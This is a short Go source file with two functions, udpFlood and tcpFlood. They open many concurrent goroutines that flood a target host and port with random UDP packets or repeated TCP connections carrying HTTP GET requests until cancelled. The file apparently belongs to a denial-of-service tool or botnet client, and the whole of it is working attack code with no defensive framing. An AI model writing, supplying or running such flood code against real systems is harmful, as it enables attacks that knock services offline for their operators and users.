package main

import (
	"context"
	"math/rand"
	"net"
	"sync"
	"time"
)

func udpFlood(ctx context.Context, target, port string, concurrents int) {
	raddr, err := net.ResolveUDPAddr("udp", net.JoinHostPort(target, port))
	if err != nil {
		logf("UDP resolve failed: %v", err)
		return
	}

	rand.Seed(time.Now().UnixNano())
	var wg sync.WaitGroup

	for i := 0; i < concurrents; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			conn, err := net.DialUDP("udp", nil, raddr)
			if err != nil {
				logf("UDP dial failed: %v", err)
				return
			}
			defer conn.Close()

			payload := make([]byte, 1024)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					rand.Read(payload)
					conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
					conn.Write(payload)
				}
			}
		}()
	}

	wg.Wait()
}

func tcpFlood(ctx context.Context, target, port string, concurrents int) {
	addr := net.JoinHostPort(target, port)
	var wg sync.WaitGroup

	for i := 0; i < concurrents; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			for {
				select {
				case <-ctx.Done():
					return
				default:
					conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
					if err != nil {
						time.Sleep(10 * time.Millisecond)
						continue
					}
					conn.SetDeadline(time.Now().Add(5 * time.Second))
					buf := make([]byte, 4096)
					conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"))
					conn.Read(buf)
					conn.Close()
				}
			}
		}()
	}

	wg.Wait()
}
